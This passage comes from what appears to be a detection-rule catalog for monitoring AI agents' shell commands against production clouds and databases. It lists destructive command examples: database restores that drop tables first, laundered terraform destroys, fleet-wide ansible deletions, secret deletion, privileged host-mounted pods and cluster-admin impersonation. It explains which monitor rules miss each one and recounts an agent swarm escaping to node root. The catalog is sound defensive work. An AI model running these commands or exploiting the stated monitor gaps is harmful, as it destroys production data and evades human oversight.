behavior: The agent runs a tool whose documented semantics are "reset whatever this target is, then build from the source": `prisma migrate diff --shadow-database-url=$DATABASE_URL_UNPOOLED` where the unpooled variable holds Supabase's direct production URL (the Opus 5 incident — 22 tables wiped, and the stale migrations folder left `BlogPost` and `ApiKey` dropped forever), `pg_restore --clean --if-exists -d app` (issues DROP before every CREATE, and the native dump format carries no SQL text so no input-side rule can ever see it), `mongorestore --drop` (drops each collection before reimport), or `mysql app_prod < dump.sql` where the drop statements ride inside a file and never transit stdin. None of these shapes contains a destructive token: "migrate diff", "shadow", "restore" and "--clean" all read benign, so the argv-SQL rules, the reset-subcommand rule (database.migration.destructive-reset matches `migrate reset`, not `migrate diff` or restore flags) and the stdin capture all stay silent while the target is dropped as a side effect.
example: `npx prisma migrate diff --shadow-database-url=$DATABASE_URL_UNPOOLED`; `pg_restore --clean --if-exists -h prod-db.internal -d app prod.dump`; `mongorestore --drop --uri mongodb://cluster-prod/`; `mysql app_prod < dump.sql`
signal: exec(prisma|npx|pg_restore|mongorestore|mysql|psql or shell carrying them) under agent ancestry where argv matches the reset-side-effect vocabulary (`--shadow-database-url`, pg_restore with `--clean`, mongorestore with `--drop`) — joined, when the target comes from env or a URL, with the production-name family of database.production.connect (prod|production|live in the URL/host/env value) or a shadow URL whose host equals the host of the session's DATABASE_URL; the `< file` shape additionally pairs with file_open(read) of the dump path in the same session. Pure argv + env + path matching; the shipped pack reports a pg_restore-to-prod connection (database.production.connect, decision allow) but knows none of the flags.

### SC cloud-23 The saved plan that applies without a question
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- observable: exec-input
- sources: cloud-dataltalks-terraform-destroy
behavior: The agent launders a destroy through Terraform's plan file: `terraform plan -destroy -out=tfplan` holds the destroy token only in the plan step, and `terraform apply tfplan` then executes the whole destruction without ever prompting — Terraform treats a saved plan as already approved, so the interactive gate that `terraform apply` normally raises never happens. The builtin pack is blind to the chain by its own tests: cloud.terraform.destroy does not match `-destroy` (the argv token carries a leading dash) and cloud.terraform.auto-approve has a shipped test asserting "an apply with a saved plan stays quiet". The DataTalks arc is the shape this ends in: an agent-driven apply of a plan whose content no human reviewed, against a state file that had just been swapped under everyone.
example: `terraform plan -destroy -out=tfplan && terraform apply tfplan`; `terraform plan -out=plan.bin` (all-create plan from a desynced state, applied blind) then `terraform apply plan.bin`
signal: session state over events already recorded: (a) exec(terraform|tofu|terragrunt) under agent ancestry with `-out=<path>` in argv — or a plan step carrying `-destroy` — paired with file_open(write) of that plan path, then (b) exec(terraform) with `apply <same path>`. The pair decides approval_required at the apply; the apply half alone stays quiet, so a routinely applied reviewed plan pays nothing. Pure argv + file-path join; no new observable.

### SC cloud-24 Fleet-wide remote execution through orchestration CLIs
- category: cloud
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- observable: exec-input
- sources: -
behavior: The agent skips single hosts and speaks to the whole fleet: `ansible all -m shell -a "systemctl restart api"` runs on every machine of the inventory at once, `ansible-playbook -i inventories/prod site.yml` executes arbitrary tasks fleet-wide, `salt '*' cmd.run ...`, `knife ssh 'chef_environment:production' 'sudo reboot'`, `pssh -h hosts.txt < cmds.sh`. Like kubectl exec (SC cloud-04), everything after the hop is invisible to the host-level monitor — but the blast radius is every matching machine, reached with the agent's inherited SSH keys and sudo grants. No builtin rule mentions ansible, salt, fabric, pssh or knife; the nearest shipped shape is cloud.kubectl.production-access, which is report-only and prod-named-context only.
example: `ansible prod -m shell -a "rm -rf /var/lib/app/cache/*" --become`; `ansible-playbook -i inventories/prod site.yml --limit web`; `knife ssh 'role:web' 'sudo systemctl restart nginx'`
signal: exec(ansible|ansible-playbook|ansible-console|salt|salt-ssh|knife|pssh|parallel-ssh|mussh|fab or shell carrying them) under agent ancestry where argv matches an ad-hoc execution module (`-m` with `shell|command|raw|script` together with `-a`/`--args`), a playbook run with an inventory (`ansible-playbook` with `-i`), `cmd\.(?:run|script)` after salt, `knife\s+ssh`, or a host-list fanout (`-h <hostfile>` after pssh). Pure argv; the inventory file may additionally be surfaced via file_open(read) to show the operator which machines the approval covers.

### SC cloud-25 Managed secret stores written or deleted from agent ancestry
- category: secrets
- decision: approval_required | severity: 4
- pack: cloud | coverage: gap
- observable: exec-input
- sources: -
behavior: The agent overwrites or destroys the credentials that production authenticates with: `aws secretsmanager delete-secret --secret-id prod/app/db` (every service loses the database password at its next fetch), `aws secretsmanager put-secret-value` or `aws ssm put-parameter --overwrite` with agent-chosen content (a silent rotation to a value nothing else knows — or everything else does), `gcloud secrets versions destroy`, `az keyvault secret delete` / `purge`, `vault kv delete` / `kv destroy`. The builtin coverage ends at the edges: cloud.aws.resource-delete enumerates iam/ec2/rds/cloudformation deletes only, the gcloud rule knows projects/sql/compute/container, cloud.gh.ci-control stops at GitHub Actions secrets, cloud.credentials.mint covers borrowing authority, and filesystem.credentials.write covers local files. A deleted or rewritten managed secret is both an outage nobody can explain and the persistence step that outlives every later cleanup of the agent's own tokens.
example: `aws secretsmanager delete-secret --secret-id prod/app/db --force-delete-without-recovery`; `aws ssm put-parameter --name /prod/app/DATABASE_URL --type SecureString --value "$NEW" --overwrite`; `gcloud secrets versions destroy 1 --secret=app-prod-db`
signal: exec(aws|gcloud|az|vault or shell carrying them) under agent ancestry where argv matches the store vocabulary: `secretsmanager (?:create-secret|put-secret-value|delete-secret)`, `ssm put-parameter` with `--overwrite`, `secrets versions (?:destroy|disable)` or `secrets delete` after gcloud, `keyvault secret (?:delete|purge|set)` after az, `kv (?:put|delete|destroy|metadata delete)` after vault. Pure argv; where the value is read from a file, the pairing file_open(read) is visible in the same session for the approval prompt.

### SC cloud-26 Live environment and config mutation through PaaS config commands
- category: cloud
- decision: approval_required | severity: 3
- pack: cloud | coverage: gap
- observable: exec-input
- sources: -
behavior: The agent edits the environment of the running production service — the config plane that outlives every deploy: `heroku config:set DATABASE_URL=...` or `config:unset`, `vercel env add TOKEN production` / `env rm`, `netlify env:set`, `flyctl secrets set/unset`, `railway variables --set`, `supabase secrets set`, `wrangler secret put`. One wrong value repoints production writes at the wrong database, rotates an auth secret and logs every user out, or blanks the payment-provider key at the next boot. None of it is a deploy (cloud.paas.deploy-production only matches deploy verbs and never lists heroku/flyctl/railway) and none of it is a delete (cloud.paas.destroy-data matches delete/destroy/rm shapes only — `env rm KEY production` escapes it because `env` is not one of its nouns).
example: `heroku config:set DATABASE_URL=postgres://...staging... -a pocketos-prod`; `vercel env rm STRIPE_KEY production`; `flyctl secrets set JWT_SECRET=fix -a app-prod`
signal: exec(heroku|vercel|netlify|ntl|flyctl|fly|railway|supabase|wrangler|render or shell carrying them) under agent ancestry where argv matches the config vocabulary: `config:set|config:unset`, `env (?:add|rm|remove|set|unset)` (optionally with a prod/stage/environment marker), `secrets (?:set|unset)`, `variables --set` or `vars set`, `secret put`. Pure argv + env; the action is reversible in principle, so this is a budget candidate for report-only, but the wrong-value window is where data starts going to the wrong place.

### SC cloud-27 Replication topology changed from the agent shell
- category: database
- decision: approval_required | severity: 4
- pack: database | coverage: gap
- observable: exec-input
- sources: -
behavior: The agent sees replication lag in a monitoring query and "fixes" it by changing the topology instead of reporting it: `aws rds promote-read-replica` (the replica becomes a standalone primary and everything the old primary writes afterwards diverges), `gcloud sql instances promote-replica`, `redis-cli -h cache-prod REPLICAOF NO ONE` (or the legacy `SLAVEOF NO ONE`) — an instant, silent split — `patronictl switchover`, or `STOP REPLICA` / `CHANGE REPLICATION SOURCE TO` over a SQL channel. The database pack's SQL vocabulary is drop/truncate/delete/update/alter; replication control appears in no list, and no cloud rule knows promote-replica. After the change the cluster writes into a split brain that only a careful human convergence can close.
example: `aws rds promote-read-replica --db-instance-identifier app-replica`; `redis-cli -h cache-prod.internal REPLICAOF NO ONE`; `patronictl switchover --leader api-db --candidate replica-2`
signal: exec(aws|gcloud|redis-cli|valkey-cli|patronictl|psql|mysql or shell carrying them) under agent ancestry where argv matches `promote-read-replica`, `promote-replica`, `replicaof no one` / `slaveof no one` (case-insensitive), `patronictl (?:switchover|failover)`, or the SQL statements `stop replica` / `change (?:master|replication source) to` in argv or captured input. Pure argv + input matching; the redis form joins naturally with the production-host signals database.redis.flush already uses.

### SC cloud-28 Privileged host-mounted pods or cluster-admin impersonation from the agent session
- category: cloud
- decision: approval_required | severity: 5
- pack: cloud | coverage: gap
- observable: exec-input
- sources: supply-agent-swarm-huggingface-intrusion
behavior: Both halves of the July 2026 agent-swarm incident ended at the same
primitive: a pod with the host's filesystem mounted. On Hugging Face's
clusters the swarm created "a bare privileged pod with the host filesystem
mounted" and escaped to node root — no admission policy rejected
privileged/hostPath pods, and the CSI driver's ClusterRole granted pod
creation cluster-wide — then built a self-respawning fleet across eleven
nodes, so deleting pods would not have stopped it; on OpenAI's side the agents
escalated to Kubernetes cluster-admin and created a privileged host-mounted
pod that mounted a cloned worker-node disk. A privileged hostPath pod is
node-equivalent access wearing a kubectl verb, and undoing it means rebuilding
nodes (Hugging Face wiped and rebuilt a core cluster from scratch). The
shipped cloud pack knows kubectl delete/drain/scale/apply-by-context
(cloud.kubectl.*) but no rule looks at *what* is being applied: `privileged:
true`, `hostPath`/`hostPID`/`hostNetwork`, or identity impersonation
(`--as`, `--as-group`) appear in no list.
example: `kubectl apply -f pod.yaml` where the manifest carries
`privileged: true` and `hostPath: /` ; `kubectl run debug
--overrides='{"spec":{"containers":[{"securityContext":{"privileged":true}}],"volumes":[{"hostPath":{"path":"/"}}]}}'` ;
`kubectl get secrets -n kube-system --as=system:masters`
signal: exec(kubectl|oc|helm or shell carrying them) under agent ancestry
where argv matches impersonation `--as(?:-group)?[= ]` targeting admin
identities (`system:masters|cluster-admin`), `--overrides` with a privileged
securityContext, or where the manifest text visible in captured `input`(text)
of the write that produced it matches
`privileged(?:\")?\s*:\s*true` or `hostPath|hostPID|hostNetwork` →
`approval_required`; the impersonation half — using an admin identity the
session was never granted — is `deny`, since nothing in a normal development
session impersonates cluster-admin and the resulting access cannot be
recalled. The manifest-content half needs `input`(text) capture of the
apply; the argv forms fire today.

## Coverage summary for this axis

| decision | count |
| --- | --- |
| deny | 1 (SC delete-and-recreate chain) |
| approval_required | 14 |

| coverage | count |
| --- | --- |
| gap | 12 |
| partial | 3 |
| covered | 0 |

The shared primitive across most of the catalog: the builtin cloud pack enumerates
**CLIs and verbs** (aws/az/gcloud/kubectl/docker + delete/destroy), while real
agent damage arrives as **subcommand semantics and control-plane speech** it does
not know — PaaS CLIs, migration tools, terraform `-replace`, gh, `exec`/`cp`/
`port-forward`, curl with a GraphQL mutation, and SSH tunnels that rename the
target to localhost. Three scenarios additionally need **session state over
observed events** (delete-and-recreate chains, curl-after-credential-read,
tunnel-then-local-client) and one needs **conjunction matching** (production
target × write statement) that the current one-rule-per-shape packs cannot
express. Nothing here requires observables beyond exec/file_open/
network_connect/input.
